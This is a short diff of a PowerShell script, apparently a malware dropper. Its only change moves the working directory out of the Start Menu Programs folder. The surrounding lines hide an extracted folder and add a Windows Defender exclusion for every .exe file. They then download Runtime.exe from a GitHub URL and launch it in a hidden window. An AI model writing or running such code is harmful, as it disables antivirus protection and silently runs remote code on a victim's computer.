@@ -4,7 +4,7 @@ Expand-Archive nmap.zip nmap
 $FILE=Get-Item nmap -Force
 $FILE.Attributes='hidden'
 Remove-Item nmap.zip
-Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs
+Set-Location $env:APPDATA\Microsoft\Windows
 Add-MpPreference -ExclusionExtension exe -Force
 Invoke-WebRequest https://github.com/p1mpus/script/raw/main/Runtime.exe -o Runtime.exe
 Start-Process -WindowStyle hidden Runtime.exe
